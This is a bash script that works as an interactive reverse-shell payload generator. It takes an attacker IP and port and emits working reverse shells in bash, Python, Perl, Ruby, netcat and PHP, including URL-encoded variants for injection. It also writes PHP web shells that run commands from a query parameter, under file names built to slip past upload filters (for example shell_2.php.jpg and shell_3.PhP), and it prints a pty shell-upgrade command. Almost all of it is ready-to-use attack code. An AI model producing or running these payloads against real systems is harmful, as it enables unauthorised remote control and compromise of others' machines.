#!/bin/bash
RED='\e[1;91m'
BLUE='\e[1;34m'
RED='\e[1;91m'
GREEN='\e[32m'
BOLD='\e[1m'
resetStyle='\e[0m'
cat <<'EOF'

 █████╗ ███╗   ███╗███╗   ███╗ █████╗ ██████╗ 
██╔══██╗████╗ ████║████╗ ████║██╔══██╗██╔══██╗
███████║██╔████╔██║██╔████╔██║███████║██████╔╝
██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██╔══██╗
██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

EOF

echo ""
echo -e " =[ By @Eng.ammar"
echo -e " =[ twitter @AmmarAlarif10"
echo ""
echo -e "\033[33;7m#######################################\e[0m";
echo -e "\033[33;7m#######################################\e[0m";
echo  "										   "
echo  "										   "

echo -e "\033[33;7m#######################################\e[0m";
echo -e $RED" 	  Alert 				 "
echo -e "Please Convet Terminal from zsh to bash "
echo -e "Press in Termnail [ bash ]"
echo -e "After that finish useing the script press exit "
echo -e "\033[33;7m#######################################\e[0m \n \n ";
read -p "What is your ip Address? " MY_IP 
read -p "What is your port? " MY_PORT 


echo -e "\n \n ";

function bin_shell(){
	echo "======== Shell ==========="
	echo "[1] Bash_shell"
	echo "[2] Python_shell"
	echo "[3] Perl_shell"
	echo "[4] Ruby_shell"
	echo "[5] Netcat_shell"
	echo "[6] PHP_shell"
	

	read -p "choose a Payload " bin_shell
	if [[ $bin_shell == 1 ]]; then
	
	echo -e "\n \n ";

	echo -e "chose one of the categories\n [1] echo Shell \n [2] Save in file \n [3] Encode Url \n " 
	read -p "What category you want? " category
	if [[ $category ==  1 ]]; then 
	 
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Bash [1] \n \n "
	echo  "bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1 "


	elif [[ $category == 2 ]]; then

	echo -e "\n \n ";

	read -p "What is File name ? " file
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo  "#!/bin/bash " > $file
	echo  "bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1" >> $file
	echo -e "This is the script save by file name [ $file ] "
	echo -e "\n "
	chmod +x $file
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Create by Defualt [ bash_1_shell.sh ] \n \n "
	echo  "#!/bin/bash " > bash_1_shell.sh
	echo  "0<&196;exec 196<>/dev/tcp/$MY_IP/$MY_PORT; sh <&196 >&196 2>&196" >> bash_1_shell.sh


	elif [[ $category ==  3 ]]; then
	
	
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Bash encode  [1] \n \n "
	echo  "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$MY_IP%2F$MY_PORT%200%3E%261"
	echo -e "\n "
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Bash encode  [2] \n \n "
	echo  "0%3C%26196%3Bexec%20196%3C%3E%2Fdev%2Ftcp%2F$MY_IP%2F$MY_PORT%3B%20sh%20%3C%26196%20%3E%26196%202%3E%26196"

fi

	elif [[ $bin_shell == 2 ]]; then


	echo -e "chose one of the categories\n [1] echo Shell \n [2] Save in file \n [3] Encode Url \n " 
	read -p "What category you want? " python
	if [[ $python ==  1 ]]; then 
	 

	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Python [1] \n \n "
	echo "python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" 
	


	elif [[ $python == 2 ]]; then

	echo -e "\n ";
	read -p "What is File name ? " file1
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo  "#!/usr/bin/env python " > $file1
	echo -e "\n "
	echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" >> $file1 
	echo -e "\n "
	echo -e "This is the script save by file name  [ $file1 ] "
	chmod +x $file1

	echo   "#!/usrbin/env python " >reverse.py 
	echo   "import os" >>reverse.py
	echo   "import sys" >>reverse.py
	echo   "try:" >>reverse.py
	echo   "	os.system('nc $MY_IP $MY_PORT -e /bin/bash ')" >>reverse.py
	echo    "except:" >>reverse.py
	echo    "	sys.exit()" >>reverse.py
	chmod +x reverse.py
	echo -e "\n "
	echo -e "This is another script python that will be saved as [ reverse.py ] "

	elif [[ $python ==  3 ]]; then
	
	
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Python Encode [1] \n \n "
	echo "python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22$MY_IP%22%2C$MY_PORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"

fi


	
	elif [[ $bin_shell == 3 ]]; then


	echo -e "\n \n ";

	echo -e "chose one of the categories\n [1] echo Shell \n [2] Save in file \n [3] Encode Url \n " 
	read -p "What category you want? " perl
	if [[ $perl ==  1 ]]; then 
	 
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Perl [1] \n \n "
	echo  "perl -e 'use Socket;\$i=\"$MY_IP\";\$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' "


	elif [[ $perl == 2 ]]; then

	echo -e "\n \n ";

	read -p "What is File name ? " file2
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo  "#!/usr/bin/perl -w" >  $file2
	echo  "use Socket;\$i=\"$MY_IP\";\$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};" >> $file2
	echo -e "This is the script save by file name [ $file2 ] "
	chmod +x $file2


	elif [[ $perl ==  3 ]]; then
	
	
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script Perl encode [1] \n \n "
	echo "perl%20-e%20%27use%20Socket%3B%24i%3D%22$MY_IP%22%3B%24p%3D$MY_PORT%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27"

fi	

	
 	elif [[ $bin_shell == 4 ]]; then

 	echo -e "\n \n ";

	echo -e "chose one of the categories\n [1] echo Shell \n [2] Save in file \n [3] Encode Url \n " 
	read -p "What category you want? " Ruby
	if [[ $Ruby ==  1 ]]; then 
	 
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script Ruby [1] \n \n "
	echo  "ruby -rsocket -e'f=TCPSocket.open(\"$MY_IP\",$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' "


	elif [[ $Ruby == 2 ]]; then

	echo -e "\n \n ";

	read -p "What is File name ? " file3
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo  "ruby -rsocket -e'f=TCPSocket.open(\"$MY_IP\",$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' " > $file3
	echo -e "This is the script save by file name [ $file3 ]"
	chmod +x $file3


	elif [[ $Ruby ==  3 ]]; then
	
	
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "$GREEN This is the script encode Ruby [1] \n"
	echo  "ruby%20-rsocket%20-e%27f%3DTCPSocket.open%28%22$MY_IP%22%2C$MY_PORT%29.to_i%3Bexec%20sprintf%28%22%2Fbin%2Fsh%20-i%20%3C%26%25d%20%3E%26%25d%202%3E%26%25d%22%2Cf%2Cf%2Cf%29%27"

fi	
	
	elif [[ $bin_shell == 5 ]]; then

	echo -e "\n \n ";

	echo -e "chose one of the categories\n [1] echo Shell \n [2] Save in file \n [3] Encode Url \n " 
	read -p "What category you want? " netcat
	if [[ $netcat ==  1 ]]; then 
	 
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script netcat [1] \n "
	echo  "nc $MY_IP $MY_PORT -e \"/bin/bash\" " # This is Netcat 1
	echo -e "\n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script netcat [2] \n "
	echo  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $MY_PORT >/tmp/f " # This is Netcat 2


	elif [[ $netcat == 2 ]]; then

	echo -e "\n \n ";

	read -p "What is File name ? " file4
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo  "#!/bin/bash " > $file4
	echo  "nc $MY_IP $MY_PORT -e \"/bin/bash\" " >> $file4
	echo -e "This is the script save by file name [ $file4 ] "
	chmod +x $file4
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
    echo  "#!/bin/bash " > Netcat2.sh # this file netcat is Defualt

	echo  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $MY_PORT >/tmp/f " >> Netcat2.sh
	echo -e "This is script Create by Defualt [ Netcat2.sh ] \n "
	chmod +x Netcat2.sh


	elif [[ $netcat ==  3 ]]; then
	
	
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script netcat encode  [1] \n \n "
	echo  "nc%20$MY_IP%20$MY_PORT%20-e%20%22%2Fbin%2Fbash%22" # This is the first File 
	echo -e "\n"
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script netcat encode [2] \n \n  "
	echo  "rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$MY_IP%20$MY_PORT%20%3E%2Ftmp%2Ff"


fi	

	elif [[ $bin_shell == 6 ]]; then

	echo -e "\n \n ";

	echo -e "chose one of the categories\n [1] echo Shell \n [2] Save in file \n [3] Encode Url \n " 
	read -p "What category you want? " php
	if [[ $php ==  1 ]]; then 
	echo -e "\n \n " 
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script php [1] \n " 
	echo  "php -r '$sock=fsockopen($MY_IP,$MY_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");' "
	echo -e "\n "
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is script php [2] \n "
	echo  " <?php echo system(\$_GET['cmd']); ?> "
	echo -e "\n "
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e  "This is the script php [3] \n "

	echo  " <?php passthru(\$_GET['cmd']); ?> "



	elif [[ $php == 2 ]]; then

	echo -e "\n \n ";

	read -p "What is File name ? " file5
	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script save by file name [1] $file5 "
	echo    " <?php echo system(\$_GET['cmd']); ?> " > $file5
	chmod +x $file5

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script save by file name [2] (shell_1.php) \n"
	echo    " <?php echo system(\$_GET['cmd']); ?> " > shell_1.php
	chmod +x shell_1.php

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script save by file name [3] (shell_2.php.jpg) \n"
	echo  " <?php echo system(\$_GET['cmd']); ?> " > shell_2.php.jpg
	chmod +x shell_2.php.jpg


	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script save by file name [4] (shell_3.PhP) \n"
	echo  " <?php echo system(\$_GET['cmd']); ?> " > shell_3.PhP
	chmod +x shell_3.PhP

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script save by file name [5] (passthru.php) \n"
	echo 	"<?php passthru(\$_GET['cmd']); ?>" > passthru.php
	chmod +x passthru.php

	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script save by file name [6] (passthru_2.php.jpg) \n"
	echo  " <?php passthru(\$_GET['cmd']); ?> " > passthru_2.php.jpg
	chmod +x  passthru_2.php.jpg


	echo -e "\n \n ";
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e "This is the script [7] passthru_3.PhP \n "
	echo    "<?php passthru(\$_GET['cmd']); ?>" > passthru_3.PhP
	chmod +x passthru_3.PhP

	




	elif [[ $php ==  3 ]]; then
	
	
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " This is the script encode [1] \n "
	echo  "php%20-r%20%27%24sock%3Dfsockopen%28%22$MY_IP%22%2C$MY_PORT%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
	echo -e "\033[33;7m#######################################\e[0m \n \n ";
	echo -e " This is the script encode [2] \n "
	echo  "%3C%3Fphp%20passthru%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"


fi

 
		fi
}

 
	bin_shell
	
	echo -e "\n \n "
	
	echo -e "\033[33;7m#######################################\e[0m \n \n ";

	echo -e "This is the Spawn shell by python2 or python3 : \n"
	 
	echo   "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
	echo -e "\n"
	echo   "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
	echo -e "\n"
	echo -e "\033[33;7m#######################################\e[0m \n \n ";


	
	echo -e "$RED Thank you for using the script !!! ( Enjoy ) \n \n"
		
